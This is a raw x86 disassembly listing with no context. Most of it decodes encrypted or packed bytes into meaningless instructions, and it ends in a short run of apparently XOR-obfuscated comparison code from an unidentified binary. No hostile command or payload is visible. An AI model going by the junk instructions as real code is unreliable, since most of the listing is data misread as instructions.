  417c16:	mul    BYTE PTR [esi-0x19]
  417c19:	adc    BYTE PTR [esi-0x7a],0x69
  417c1d:	cmc    
  417c1e:	jg     0x417c07
  417c20:	in     al,dx
  417c21:	jo     0x417c01
  417c23:	(bad)  
  417c25:	cmp    cl,BYTE PTR [edx+0x677aabb9]
  417c2b:	icebp  
  417c2c:	xor    ecx,DWORD PTR [ecx*4-0x4c48744b]
  417c33:	stc    
  417c34:	lahf   
  417c35:	cmp    al,0x77
  417c37:	xor    al,0x80
  417c39:	mov    bh,0x79
  417c3b:	and    al,0x20
  417c3d:	fistp  DWORD PTR [eax]
  417c3f:	inc    ecx
  417c40:	xor    DWORD PTR [esi],0xffffffe1
  417c43:	outs   dx,BYTE PTR ds:[esi]
  417c44:	ror    bl,cl
  417c46:	sub    DWORD PTR [esi-0x6761754e],esi
  417c4c:	scas   al,BYTE PTR es:[edi]
  417c4d:	sbb    dl,BYTE PTR [ecx+0x77]
  417c50:	out    dx,al
  417c51:	jg     0x417c32
  417c53:	loop   0x417c33
  417c55:	das    
  417c56:	dec    eax
  417c57:	or     eax,0xab3aa386
  417c5c:	mov    edi,0x9b2b45ca
  417c61:	enter  0xa93,0x3b
  417c65:	neg    DWORD PTR [eax]
  417c67:	lahf   
  417c68:	xchg   cl,ch
  417c6a:	mov    eax,ds:0x906d409e
  417c6f:	sbb    ebp,DWORD PTR [ebx+0x48]
  417c72:	bound  ebx,QWORD PTR [ebp+0x18c6ba2a]
  417c78:	cmp    esp,DWORD PTR [ebx-0xe]
  417c7b:	fbstp  TBYTE PTR ds:0x1ebc869e
  417c81:	sbb    edx,ecx
  417c83:	mov    ds:0x2ce383cc,eax
  417c88:	fwait
  417c89:	inc    eax
  417c8a:	stos   BYTE PTR es:[edi],al
  417c8b:	mov    ebx,0x6aa5e648
  417c90:	add    ch,BYTE PTR [edi]
  417c92:	aaa    
  417c93:	cmp    al,0xc9
  417c95:	clc    
  417c96:	nop
  417c97:	jecxz  0x417cac
  417c99:	fiadd  WORD PTR [ebx-0x65]
  417c9c:	jns    0x417cad
  417c9e:	pop    edx
  417c9f:	xor    eax,0x5e774dfb
  417ca4:	retf   0x277
  417ca7:	dec    edx
  417ca8:	ds ins DWORD PTR es:[edi],dx
  417caa:	dec    ebp
  417cab:	call   0x6f3eb023
  417cb0:	push   ecx
  417cb1:	outs   dx,DWORD PTR ds:[esi]
  417cb2:	outs   dx,DWORD PTR ds:[esi]
  417cb3:	loop   0x417cd7
  417cb5:	loope  0x417c7d
  417cb7:	call   0x68eafb99
  417cbc:	sbb    bl,BYTE PTR [edi]
  417cbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cbf:	stos   BYTE PTR es:[edi],al
  417cc0:	jmp    0x2515c49c
  417cc5:	mov    WORD PTR [eax-0x4a],?
  417cc8:	jp     0x417d05
  417cca:	popf   
  417ccb:	mov    esp,0x7d7ca670
  417cd0:	pop    esp
  417cd1:	aas    
  417cd2:	push   0x87392ccd
  417cd7:	repz jnp 0x417cc0
  417cda:	call   FWORD PTR [ecx]
  417cdc:	dec    edx
  417cdd:	aam    0x9c
  417cdf:	jb     0x417cb7
  417ce1:	dec    edi
  417ce2:	pop    esi
  417ce3:	aam    0x25
  417ce5:	outs   dx,BYTE PTR ds:[esi]
  417ce6:	jb     0x417cc4
  417ce8:	pop    eax
  417ce9:	js     0x417cdb
  417ceb:	ror    BYTE PTR [eax+0x31],0x5a
  417cef:	leave  
  417cf0:	mov    esp,0xa83aaa34
  417cf5:	cmp    BYTE PTR [edi-0xf],cl
  417cf8:	jo     0x417c7e
  417cfa:	mov    ds:0x840f755b,al
  417cff:	sbb    BYTE PTR [edi+0x31673c21],dl
  417d05:	ja     0x417d62
  417d07:	inc    edx
  417d08:	iret   
  417d09:	imul   BYTE PTR [esi+0x734a2c6d]
  417d0f:	(bad)  
  417d11:	inc    edx
  417d12:	push   cs
  417d13:	mov    eax,ds:0x4c75b7f0
  417d18:	xchg   BYTE PTR [ebp+0x13b95d18],ch
  417d1e:	adc    BYTE PTR [ebp-0x5a1c71f4],dl
  417d24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d25:	rcr    BYTE PTR [esi],0x80
  417d28:	or     al,0xe4
  417d2a:	dec    esp
  417d2b:	xchg   esi,eax
  417d2c:	jp     0x417cd5
  417d2e:	aaa    
  417d2f:	adc    al,0x7b
  417d31:	mov    bl,0x4c
  417d33:	sahf   
  417d34:	dec    ecx
  417d35:	add    al,0x69
  417d37:	stos   BYTE PTR es:[edi],al
  417d38:	gs push cs
  417d3a:	daa    
  417d3b:	xchg   ebx,eax
  417d3c:	out    dx,al
  417d3d:	lea    eax,[esi-0x2e]
  417d40:	jmp    0xf890:0x66146ecc
  417d47:	jb     0x417da9
  417d49:	xchg   esi,eax
  417d4a:	or     al,0x9
  417d4c:	sub    BYTE PTR fs:[ebx+0x594df50f],0xb4
  417d54:	std    
  417d55:	fs pop ebp
  417d57:	jg     0x417d17
  417d59:	push   esi
  417d5a:	push   cs
  417d5b:	int    0x68
  417d5d:	lods   al,BYTE PTR ds:[esi]
  417d5e:	inc    esi
  417d5f:	in     eax,dx
  417d60:	add    bh,BYTE PTR [ebx+0x9]
  417d63:	les    ebx,FWORD PTR ss:[edi]
  417d66:	push   esp
  417d67:	pop    es
  417d68:	fdivr  st(7),st
  417d6a:	sar    DWORD PTR [edx-0x70b04d78],0x18
  417d71:	jae    0x417d55
  417d73:	or     DWORD PTR [ecx+0x6268a187],0xc9f1c9e9
  417d7d:	add    al,0x4
  417d7f:	sti    
  417d80:	ficom  WORD PTR [edx]
  417d82:	lahf   
  417d83:	xor    ebx,DWORD PTR [edi+eax*1+0x3b]
  417d87:	push   esi
  417d88:	dec    esp
  417d89:	xor    BYTE PTR [ebx-0x102703f7],bh
  417d8f:	pop    ebx
  417d90:	pushf  
  417d91:	hlt    
  417d92:	sub    eax,0x77a6b597
  417d97:	xchg   ebp,eax
  417d98:	cmp    edx,ebp
  417d9a:	vpackuswb ymm7,ymm5,ymm1
  417d9e:	push   ebp
  417d9f:	lods   eax,DWORD PTR ds:[esi]
  417da0:	or     al,0x86
  417da2:	(bad)  
  417da3:	(bad)  [edx-0x3882d559]
  417da9:	fcomp  DWORD PTR [ebx+0x207de51e]
  417daf:	es jecxz 0x417d4b
  417db2:	ret    
  417db3:	fdiv   QWORD PTR [esi+0x675ec86a]
  417db9:	mov    ebx,0xfc97fd60
  417dbe:	pop    esi
  417dbf:	inc    ebx
  417dc0:	imul   esp,ebp,0xac3b3bea
  417dc6:	dec    edx
  417dc7:	div    BYTE PTR [esi]
  417dc9:	iret   
  417dca:	add    eax,0x3ebeaf2f
  417dcf:	sbb    BYTE PTR [ecx-0x57175fd8],dl
  417dd5:	pop    ecx
  417dd6:	mov    al,ds:0x9a56f466
  417ddb:	sbb    BYTE PTR [esi+0x4b464752],dl
  417de1:	and    esp,DWORD PTR [ecx]
  417de3:	inc    esp
  417de4:	jmp    0x96a2:0x7f3d1791
  417deb:	sbb    bl,al
  417ded:	test   eax,0x2409c80a
  417df2:	sbb    BYTE PTR [ebx],al
  417df4:	xchg   ecx,eax
  417df5:	xor    DWORD PTR [edi+0x6d],ecx
  417df8:	sbb    DWORD PTR [ebp-0xe1f76bf],edx
  417dfe:	push   esi
  417dff:	aaa    
  417e00:	or     eax,0xe20e9e49
  417e05:	test   DWORD PTR [eax+0x679b9cf1],eax
  417e0b:	adc    ah,0xfc
  417e0e:	or     bh,BYTE PTR [edi-0x23]
  417e11:	jbe    0x417def
  417e13:	retf   0x53cd
  417e16:	push   ebp
  417e17:	xchg   ebp,eax
  417e18:	pop    ebx
  417e19:	lock mov bh,0x40
  417e1c:	ss out 0xc7,al
  417e1f:	scas   al,BYTE PTR es:[edi]
  417e20:	xor    DWORD PTR [edx+0xfae20c5],ebx
  417e26:	mov    ecx,0x8e8f20d3
  417e2b:	sub    DWORD PTR [ebp-0x42],edi
  417e2e:	adc    al,0xce
  417e30:	jmp    0x3bf3:0x7e2f3bfc
  417e37:	mov    dh,ah
  417e39:	or     al,0xfa
  417e3b:	pop    ss
  417e3c:	(bad)  
  417e3d:	shl    DWORD PTR [edi+0x11],1
  417e40:	iret   
  417e41:	push   ebp
  417e42:	mov    cl,0x53
  417e44:	pop    edx
  417e45:	push   esp
  417e46:	mov    bh,0x7d
  417e48:	inc    edi
  417e49:	fwait
  417e4a:	mov    ebp,0xbd10d688
  417e4f:	out    0x4b,al
  417e51:	mov    ch,0x8d
  417e53:	dec    ebx
  417e54:	add    eax,DWORD PTR [ecx+0x35e7f121]
  417e5a:	mov    fs,WORD PTR [edx+0x1c]
  417e5d:	rcr    BYTE PTR [edx],1
  417e5f:	fmul   DWORD PTR [esi+ebx*2+0x3d]
  417e63:	or     eax,0x4b9c9b4b
  417e68:	mov    dl,0x21
  417e6a:	cld    
  417e6b:	loop   0x417e17
  417e6d:	pop    edx
  417e6e:	push   eax
  417e6f:	jg     0x417e22
  417e71:	mov    dh,BYTE PTR ds:0xc0ea8eec
  417e77:	push   ebx
  417e78:	fs adc cl,dl
  417e7b:	jp     0x417ee9
  417e7d:	push   esi
  417e7e:	add    eax,0xd8c00945
  417e83:	lds    edx,FWORD PTR [esi+edi*1]
  417e86:	pop    eax
  417e87:	call   0xb3d27295
  417e8c:	pop    es
  417e8d:	xchg   esi,eax
  417e8e:	(bad)  
  417e8f:	push   esi
  417e90:	nop
  417e91:	add    edi,edi
  417e93:	adc    eax,0x320525fd
  417e98:	jecxz  0x417e46
  417e9a:	add    al,0x20
  417e9c:	xchg   ebp,eax
  417e9d:	pop    esp
  417e9e:	mov    cl,0x7f
  417ea0:	or     ebx,DWORD PTR [edx+ebx*4]
  417ea3:	imul   BYTE PTR [ecx]
  417ea5:	mov    dh,0x8b
  417ea7:	lods   al,BYTE PTR ds:[esi]
  417ea8:	imul   esp,DWORD PTR [edx+0x6857c1d],0x5d
  417eaf:	jmp    0x40b5f751
  417eb4:	jmp    0x417e96
  417eb6:	add    eax,0x5fb74cb5
  417ebb:	int    0x58
  417ebd:	sbb    al,0x23
  417ebf:	stos   BYTE PTR es:[edi],al
  417ec0:	call   0x5b39:0xaa4ede48
  417ec7:	test   DWORD PTR [edx],0xc379d2fe
  417ecd:	dec    ebp
  417ece:	mov    esp,0x61bbdbea
  417ed3:	inc    esp
  417ed4:	mov    ds:0xd243e857,eax
  417ed9:	ins    BYTE PTR es:[edi],dx
  417eda:	ins    BYTE PTR es:[edi],dx
  417edb:	dec    edx
  417edc:	push   0x28
  417ede:	inc    esi
  417edf:	data16 fidiv WORD PTR [bx+si+0x916]
  417ee6:	enter  0x276e,0xed
  417eea:	mov    eax,ds:0x61b7e110
  417eef:	rep ins BYTE PTR es:[edi],dx
  417ef1:	aad    0x1b
  417ef3:	mov    es,WORD PTR [ebp+0x71]
  417ef6:	out    0xcc,al
  417ef8:	xchg   edi,eax
  417ef9:	scas   al,BYTE PTR es:[edi]
  417efa:	fcmovu st,st(7)
  417efc:	(bad)  
  417efd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417efe:	(bad)  
  417f00:	(bad)
  417f04:	(bad)  
  417f05:	push   ss
  417f06:	push   edi
  417f07:	inc    ebp
  417f08:	mov    bl,0x5a
  417f0a:	ins    BYTE PTR es:[edi],dx
  417f0b:	lahf   
  417f0c:	(bad)  
  417f0d:	mov    ds:0xc0e61938,al
  417f12:	push   0x82c2114c
  417f17:	div    BYTE PTR [esp+edx*8]
  417f1a:	daa    
  417f1b:	pop    edx
  417f1c:	es sub ebx,esi
  417f1f:	mov    eax,0x45f39e2
  417f24:	push   esp
  417f25:	dec    ebp
  417f26:	loopne 0x417f60
  417f28:	push   0x37
  417f2a:	fsubr  QWORD PTR [esp+edi*8-0x63]
  417f2e:	mov    esp,esi
  417f30:	push   0x6f4f9283
  417f35:	sub    eax,0x35bab4ae
  417f3a:	or     BYTE PTR [esi-0x53],0x3c
  417f3e:	adc    BYTE PTR [edx+0x34fcec46],bh
  417f44:	jnp    0x417f01
  417f46:	aaa    
  417f47:	pop    esi
  417f48:	or     al,0x12
  417f4a:	mov    edx,0x78173ac6
  417f4f:	das    
  417f50:	mov    al,ds:0x6a4d875d
  417f55:	ins    BYTE PTR es:[edi],dx
  417f56:	lock stos DWORD PTR es:[edi],eax
  417f58:	mov    ?,WORD PTR [ebp-0x4ed9285e]
  417f5e:	stc    
  417f5f:	sbb    ah,dl
  417f61:	stos   DWORD PTR es:[edi],eax
  417f62:	sbb    DWORD PTR [ecx+0x70],0x64
  417f66:	fstp   TBYTE PTR [esi]
  417f68:	inc    eax
  417f69:	jnp    0x417fea
  417f6b:	mov    ds:0x6ef9e92a,eax
  417f70:	add    eax,esp
  417f72:	clc    
  417f73:	outs   dx,BYTE PTR ds:[esi]
  417f74:	xchg   edx,eax
  417f75:	je     0x417f62
  417f77:	imul   ebp,DWORD PTR [eax*4+0x2e724953],0x15
  417f7f:	aas    
  417f80:	lock aas 
  417f82:	loope  0x417fe2
  417f84:	out    dx,al
  417f85:	ins    BYTE PTR es:[edi],dx
  417f86:	iret   
  417f87:	das    
  417f88:	mul    DWORD PTR [ebx+0x477a56d]
  417f8e:	cli    
  417f8f:	or     cl,BYTE PTR [edi]
  417f91:	pop    eax
  417f92:	fnstcw WORD PTR [edx-0x4b6486f7]
  417f98:	xor    esp,edi
  417f9a:	es into 
  417f9c:	mov    cl,0xb6
  417f9e:	add    BYTE PTR [edx+0x47bd64a4],0xd9
  417fa5:	es stc 
  417fa7:	popa   
  417fa8:	mov    ds:0x72afa20e,al
  417fad:	push   edx
  417fae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417faf:	fadd   QWORD PTR [ebx]
  417fb1:	arpl   WORD PTR [ebx],bx
  417fb3:	into   
  417fb4:	pop    ebp
  417fb5:	push   edi
  417fb6:	pop    ss
  417fb7:	retf   0xfdf2
  417fba:	cld    
  417fbb:	inc    edi
  417fbc:	jnp    0x418005
  417fbe:	cli    
  417fbf:	push   cs
  417fc0:	test   BYTE PTR [edx+0x4538d5a7],dh
  417fc6:	cld    
  417fc7:	xor    BYTE PTR [edx],bl
  417fc9:	arpl   WORD PTR [eax+0x5],si
  417fcc:	inc    ebp
  417fcd:	pop    ecx
  417fce:	mov    ebx,0x7e833998
  417fd3:	cmp    al,0xe5
  417fd5:	add    DWORD PTR [esi-0x67],ebp
  417fd8:	(bad)  
  417fd9:	xchg   edi,eax
  417fda:	jno    0x417f83
  417fdc:	xchg   ebx,eax
  417fdd:	fbstp  TBYTE PTR [esi-0x6e]
  417fe0:	gs jae 0x417feb
  417fe3:	mov    ds:0x6b6f710d,al
  417fe8:	fmul   QWORD PTR [ecx]
  417feb:	in     al,dx
  417fec:	imul   edi,DWORD PTR [ebp-0x7501d163],0xe8b97f0
  417ff6:	inc    ebx
  417ff7:	sbb    edx,DWORD PTR [ecx]
  417ff9:	mov    ebx,0x1914112d
  417ffe:	mov    eax,ds:0xd79150e0
  418003:	push   0xde266cad
  418008:	cmp    ecx,esi
  41800a:	and    dl,BYTE PTR [eax+0x433ab412]
  418010:	and    eax,0xf33c97d4
  418015:	sar    BYTE PTR [ecx],1
  418017:	mov    esp,0xe7aee10d
  41801c:	shl    DWORD PTR [edx-0x3bd7ed3a],cl
  418022:	call   0xdf7e0640
  418027:	inc    edi
  418028:	sbb    al,0x1
  41802a:	dec    ebx
  41802b:	fld    TBYTE PTR [ecx-0x75]
  41802e:	push   ds
  41802f:	mul    bl
  418031:	into   
  418032:	test   al,0x58
  418034:	ret    0x4891
  418037:	pop    esi
  418038:	mov    ecx,0xf77bb297
  41803d:	mov    esp,0x9448a295
  418042:	and    BYTE PTR [edi],dh
  418044:	bound  esi,QWORD PTR [edx]
  418046:	cdq    
  418047:	cli    
  418048:	pushf  
  418049:	xchg   ebx,eax
  41804a:	jbe    0x4180ac
  41804c:	dec    edi
  41804d:	or     DWORD PTR [edi+0x2200426],0xf552680d
  418057:	jno    0x418080
  418059:	jnp    0x418049
  41805b:	xlat   BYTE PTR ds:[ebx]
  41805c:	dec    ecx
  41805d:	stos   DWORD PTR es:[edi],eax
  41805e:	aam    0x83
  418060:	sbb    eax,0x62f16737
  418065:	xchg   ebp,eax
  418066:	int3   
  418067:	gs push ebx
  418069:	inc    esi
  41806a:	pop    esp
  41806b:	sti    
  41806c:	dec    ebp
  41806d:	aas    
  41806e:	sub    BYTE PTR [ebp+0x3fb2fe9b],ah
  418074:	repnz push cs
  418076:	ins    DWORD PTR es:[edi],dx
  418077:	jl     0x418019
  418079:	mov    DWORD PTR [ebp-0x354f9f1d],ebp
  41807f:	dec    ebx
  418080:	mov    bh,0x3e
  418082:	adc    eax,DWORD PTR [eax+0x40]
  418085:	lahf   
  418086:	pop    esi
  418087:	(bad)  
  418088:	in     eax,0x67
  41808a:	outs   dx,BYTE PTR ds:[esi]
  41808b:	cdq    
  41808c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41808d:	jmp    DWORD PTR [edi+0x6f65ea46]
  418093:	scas   eax,DWORD PTR es:[edi]
  418094:	sub    eax,0x4392cd56
  418099:	mov    esp,0x28b3f525
  41809e:	inc    ebp
  41809f:	jmp    0x3fb57db9
  4180a4:	idiv   BYTE PTR [eax]
  4180a6:	inc    esp
  4180a7:	push   ebx
  4180a8:	dec    ebx
  4180a9:	(bad)  
  4180aa:	cmp    DWORD PTR [edi-0x4d],edi
  4180ad:	pop    esi
  4180ae:	cmp    DWORD PTR [eax+0x7f],ebp
  4180b1:	cmp    cl,BYTE PTR [edi+0x12490339]
  4180b7:	(bad)  
  4180b8:	push   eax
  4180b9:	in     al,0x3b
  4180bb:	sub    dl,BYTE PTR [ebp+esi*4-0x1069082f]
  4180c2:	aad    0xe5
  4180c4:	jl     0x41804c
  4180c6:	out    0x4c,al
  4180c8:	dec    eax
  4180c9:	test   ecx,edi
  4180cb:	xchg   ebp,eax
  4180cc:	lahf   
  4180cd:	lahf   
  4180ce:	sub    DWORD PTR [eax],eax
  4180d0:	add    ch,dl
  4180d2:	stos   DWORD PTR es:[edi],eax
  4180d3:	aaa    
  4180d4:	in     al,dx
  4180d5:	test   BYTE PTR cs:[edx],ch
  4180d8:	in     al,0x1f
  4180da:	inc    eax
  4180db:	fld    QWORD PTR ds:0xb88dd3ba
  4180e1:	pop    ds
  4180e2:	lods   al,BYTE PTR ds:[esi]
  4180e3:	xchg   edi,eax
  4180e4:	ja     0x418077
  4180e6:	nop
  4180e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180e8:	push   0x71
  4180ea:	repnz imul esp,DWORD PTR [edi-0x7d83f71a],0xffffffcc
  4180f2:	imul   ebp,ebx,0x4a76aa80
  4180f8:	mov    edx,DWORD PTR [edi+0x683df993]
  4180fe:	add    DWORD PTR [ebp+0x161be30e],edi
  418104:	je     0x4180d0
  418106:	push   ebx
  418107:	or     bh,BYTE PTR [eax-0x5c52a07e]
  41810d:	pop    ecx
  41810e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41810f:	fwait
  418110:	scas   al,BYTE PTR es:[edi]
  418111:	mov    DWORD PTR [edx+0x4c8518c3],esp
  418117:	out    0xed,eax
  418119:	pop    es
  41811a:	push   es
  41811b:	in     al,dx
  41811c:	xchg   edi,eax
  41811d:	fcom   DWORD PTR [eax]
  41811f:	and    DWORD PTR [edx-0x1b],0x18574750
  418126:	les    edi,FWORD PTR [ebx-0x242de925]
  41812c:	sbb    edx,0x3bf40ca8
  418132:	shl    DWORD PTR ds:0x67c99081,1
  418138:	mov    dh,0x5f
  41813a:	jle    0x418189
  41813c:	(bad)  [eax+ebx*8]
  41813f:	pop    eax
  418140:	mov    BYTE PTR [esp+ebp*2+0x51],dl
  418144:	xor    al,0x47
  418146:	enter  0x4304,0x81
  41814a:	int3   
  41814b:	mov    ds:0x1d548231,eax
  418150:	test   ah,ch
  418152:	xchg   BYTE PTR [ebx],ch
  418154:	xchg   ecx,eax
  418155:	mov    bl,0xa0
  418157:	popw   ds
  418159:	mov    edi,0xb5d4e83f
  41815e:	xchg   ebx,eax
  41815f:	(bad)  
  418160:	das    
  418161:	mov    al,0x96
  418163:	jns    0x4180ec
  418165:	xchg   ecx,eax
  418166:	loop   0x418186
  418168:	loope  0x41817b
  41816a:	test   al,0x65
  41816c:	imul   ebx,DWORD PTR [ebp-0x484746b3],0x4b
  418173:	cdq    
  418174:	cmp    bh,BYTE PTR [ebx-0x2a]
  418177:	mov    al,ds:0xc03c6c48
  41817c:	pop    ebp
  41817d:	jmp    0x24f3:0x38812084
  418184:	xor    al,0x89
  418186:	xor    esp,DWORD PTR [esi-0xe18c8f1]
  41818c:	mov    esp,0x62b5eb8a
  418191:	xchg   edx,eax
  418192:	mov    ebx,fs
  418194:	dec    edi
  418195:	xchg   ebp,eax
  418196:	cs jecxz 0x418190
  418199:	mov    ?,WORD PTR [ebx-0x22]
  41819c:	ja     0x41816c
  41819e:	mov    ds:0x1fe1498e,al
  4181a3:	inc    ebp
  4181a4:	aas    
  4181a5:	rcr    DWORD PTR [esi-0x10],1
  4181a8:	dec    DWORD PTR [edi+0x20]
  4181ab:	fnsave [edi-0x257d8d70]
  4181b1:	cmp    DWORD PTR [ecx+edi*8+0x96eb3dc],0xce171560
  4181bc:	push   ebx
  4181bd:	add    eax,0xa2de313f
  4181c2:	aaa    
  4181c3:	mov    bl,0xd8
  4181c5:	dec    edx
  4181c6:	push   cs
  4181c7:	rcr    ebp,1
  4181c9:	jne    0x4181ce
  4181cb:	jno    0x418214
  4181cd:	mov    ebx,0x5df3bc87
  4181d2:	cmp    eax,0x40f20a45
  4181d7:	pop    esp
  4181d8:	cmp    al,0xd0
  4181da:	pop    ds
  4181db:	push   ecx
  4181dc:	fld    DWORD PTR [ecx]
  4181de:	sbb    cl,BYTE PTR [eax]
  4181e0:	test   ah,al
  4181e2:	in     eax,0xc2
  4181e4:	or     BYTE PTR [esi],ah
  4181e6:	jge    0x41823a
  4181e8:	imul   ebx,DWORD PTR ds:0x7e03d3ef,0x6b4041cf
  4181f2:	dec    esp
  4181f3:	add    al,0xbc
  4181f5:	lock aas 
  4181f7:	nop
  4181f8:	mov    eax,ds:0xc5fda0d
  4181fd:	(bad)  
  4181fe:	nop
  4181ff:	ja     0x4181ed
  418201:	mov    bl,0x21
  418203:	into   
  418204:	mov    eax,ds:0xfb914f2a
  418209:	cmp    esp,ebp
  41820b:	xchg   DWORD PTR [ebx-0x51],ebp
  41820e:	xor    edi,DWORD PTR [edi-0x30]
  418211:	jo     0x41824b
  418213:	push   0x1f
  418215:	xor    BYTE PTR [esi],0x14
  418218:	push   ds
  418219:	and    al,0x9a
  41821b:	fwait
  41821c:	inc    ebx
  41821d:	add    al,0x29
  41821f:	das    
  418220:	popa   
  418221:	iret   
  418222:	loop   0x41827a
  418224:	xor    bh,BYTE PTR [ebp-0x502cdf7d]
  41822a:	push   edx
  41822b:	retf   0x83a0
  41822e:	mov    dl,0x24
  418230:	jns    0x418239
  418232:	stos   DWORD PTR es:[edi],eax
  418233:	mov    ecx,0xf4f31692
  418238:	popf   
  418239:	mov    ecx,0x4c412351
  41823e:	enter  0x2dd0,0x9a
  418242:	cmp    dh,0xb6
  418245:	jb     0x418284
  418247:	sub    bl,BYTE PTR [esi+edx*4-0x5d]
  41824b:	pop    edi
  41824c:	iret   
  41824d:	retf   0x2428
  418250:	xor    bh,ch
  418252:	test   al,0xc
  418254:	jns    0x41825e
  418256:	je     0x41826c
  418258:	mov    ebp,0x76e090d5
  41825d:	fcmovb st,st(3)
  41825f:	fild   WORD PTR [edx+0x6d]
  418262:	jle    0x418253
  418264:	pop    esp
  418265:	sbb    dl,BYTE PTR [esi-0x6e224e1]
  41826b:	scas   al,BYTE PTR es:[edi]
  41826c:	ds out 0xc1,eax
  41826f:	out    0x73,al
  418271:	call   0xafe1:0x7a1e1739
  418278:	jae    0x41827d
  41827a:	push   esi
  41827b:	xchg   BYTE PTR [ebx-0x4815b6e9],bl
  418281:	ret    0x4eda
  418284:	popf   
  418285:	(bad)  
  418286:	into   
  418287:	xor    BYTE PTR [edi+0x7d6680cb],0xe0
  41828e:	pop    ss
  41828f:	test   eax,0xc6203bfb
  418294:	mov    dh,0x54
  418296:	loopne 0x4182ee
  418298:	pop    edx
  418299:	or     al,0x59
  41829b:	(bad)  
  41829c:	popf   
  41829d:	test   eax,0xe692ebae
  4182a2:	pop    ds
  4182a3:	pop    esi
  4182a4:	sbb    BYTE PTR [ebx],ah
  4182a6:	loope  0x418310
  4182a8:	sbb    esp,ebx
  4182aa:	xchg   ecx,eax
  4182ab:	adc    esi,DWORD PTR [edx]
  4182ad:	add    ah,BYTE PTR [edx-0x149dd982]
  4182b3:	pop    ebp
  4182b4:	jnp    0x4182b8
  4182b6:	std    
  4182b7:	mov    ecx,esp
  4182b9:	aam    0xd
  4182bb:	pop    ss
  4182bc:	outs   dx,DWORD PTR ds:[esi]
  4182bd:	imul   ebx,DWORD PTR [ebx+0x4f9658a6],0xecc40c76
  4182c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182c8:	icebp  
  4182c9:	call   0x799:0xae09d752
  4182d0:	xchg   esi,eax
  4182d1:	(bad)  
  4182d3:	pop    fs
  4182d5:	mov    eax,0x8affa184
  4182da:	mov    dh,0x17
  4182dc:	in     al,dx
  4182dd:	and    DWORD PTR [eax],ecx
  4182df:	test   al,0xe8
  4182e1:	mov    cl,0xeb
  4182e3:	test   edx,eax
  4182e5:	pop    ss
  4182e6:	mov    al,ds:0x8f2158dd
  4182eb:	sbb    BYTE PTR [esi],bl
  4182ed:	and    eax,0x1f609642
  4182f2:	pop    esi
  4182f3:	push   edi
  4182f4:	icebp  
  4182f5:	sbb    DWORD PTR [ebp-0x16e6e811],esp
  4182fb:	xor    bh,BYTE PTR ds:[edi]
  4182fe:	fadd   DWORD PTR [ebx-0xc]
  418301:	lods   al,BYTE PTR ds:[esi]
  418302:	push   esi
  418303:	jbe    0x41837a
  418305:	inc    ebp
  418306:	stc    
  418307:	pusha  
  418308:	xlat   BYTE PTR ds:[ebx]
  418309:	add    al,BYTE PTR [ecx+0x5]
  41830c:	inc    bx
  41830e:	xchg   ecx,eax
  41830f:	xchg   ecx,eax
  418310:	mov    bl,0x84
  418312:	inc    eax
  418313:	push   0x39
  418315:	or     eax,0xf6483100
  41831a:	inc    ebx
  41831b:	jb     0x4182a1
  41831d:	mov    eax,0xd3eb0ba1
  418322:	jmp    0xd776:0x227046a5
  418329:	fnsave [edi+edi*1-0x25a8e2ba]
  418330:	mov    al,0xbd
  418332:	xor    DWORD PTR [ebp-0x38],edx
  418335:	pop    ecx
  418336:	sub    DWORD PTR [eax+0x7c26e9ee],esp
  41833c:	jno    0x4182e8
  41833e:	and    BYTE PTR ds:0x6874c939,al
  418344:	(bad)  
  418345:	fidivr WORD PTR [edx+0x5c6fab52]
  41834b:	popaw  
  41834d:	sahf   
  41834e:	push   cs
  41834f:	call   0xc175:0x8600bcab
  418356:	pop    eax
  418357:	pop    ebx
  418358:	imul   ebx,DWORD PTR [ebp-0x4d],0x470e1ed8
  41835f:	test   al,0x8b
  418361:	mov    bl,BYTE PTR [eax-0x649ac3cd]
  418367:	fs mov edx,0xe4cf17b1
  41836d:	aam    0xd5
  41836f:	mov    eax,0x4f1d2bb5
  418374:	pop    edi
  418375:	push   eax
  418376:	xor    esp,edi
  418378:	imul   eax,esi,0x12e5d803
  41837e:	xor    esi,DWORD PTR [ebx+0x58]
  418381:	xor    ecx,DWORD PTR [ebx+0x4d2c67f4]
  418387:	jne    0x413c7e
  41838d:	mov    edx,DWORD PTR [ebp-0xc]
  418390:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418397:	mov    bl,BYTE PTR [ebp-0x1]
  41839a:	cmp    dl,bl
  41839c:	je     0x41a7c3
  4183a2:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183a5:	mov    edx,DWORD PTR [ebp-0xc]
  4183a8:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4183af:	mov    ebx,DWORD PTR [ebp+0xc]
  4183b2:	xor    ecx,eax
  4183b4:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  4183bb:	jne    0x41cc40
  4183c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183c4:	mov    edx,DWORD PTR [ebp+0xc]
  4183c7:	xor    ecx,eax
  4183c9:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  4183d1:	mov    edx,DWORD PTR [ebp-0x18]
  4183d4:	xor    edx,eax
  4183d6:	add    edx,esi
  4183d8:	cmp    ecx,edx
  4183da:	mov    ecx,DWORD PTR [ebp-0x14]
  4183dd:	mov    DWORD PTR [ebp+0x8],ecx
  4183e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4183e3:	je     0x41cd48
  4183e9:	xor    ecx,eax
  4183eb:	add    ecx,esi
  4183ed:	mov    ecx,0x242ebe9
  4183f2:	je     0x41cb94
  4183f8:	mov    edx,DWORD PTR [ebp+0x8]
  4183fb:	mov    ebx,DWORD PTR [ebp-0x8]
  4183fe:	xor    edx,eax
  418400:	xor    ebx,eax
  418402:	sub    edx,ebx
  418404:	sub    edx,esi
  418406:	xor    edx,eax
  418408:	mov    DWORD PTR [ebp+0x8],edx
  41840b:	mov    edx,DWORD PTR [ebp+0x8]
  41840e:	mov    ebx,DWORD PTR [ebp-0x58]
  418411:	add    edx,0x5708c4
  418417:	imul   edx,ebx
  41841a:	mov    DWORD PTR [ebp-0x58],edx
  41841d:	mov    edx,DWORD PTR [ebp+0x8]
